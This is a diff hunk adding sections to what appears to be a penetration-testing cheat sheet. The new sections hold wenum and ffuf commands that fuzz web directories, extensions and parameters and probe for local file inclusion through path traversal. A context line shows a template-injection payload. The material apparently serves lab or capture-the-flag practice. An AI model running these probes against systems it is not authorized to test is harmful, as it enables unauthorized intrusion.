@@ -267,6 +267,26 @@ console.log(encoded);
 {{ ‘’.__class__.__mro__[1].__subclasses__() }}
 ```
 
+## wenum
+
+```bash
+wenum -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 -u "http://154.57.164.82:30400/get.php?x=FUZZ"
+```
+
+## ffuf
+
+```bash
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
+
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/file-extensions.txt:FUZZ -u http://<SERVER_IP>:<PORT>/test.FUZZ
+
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
+
+ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
+
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
+```
+
 ## wfuzz
 
 ```
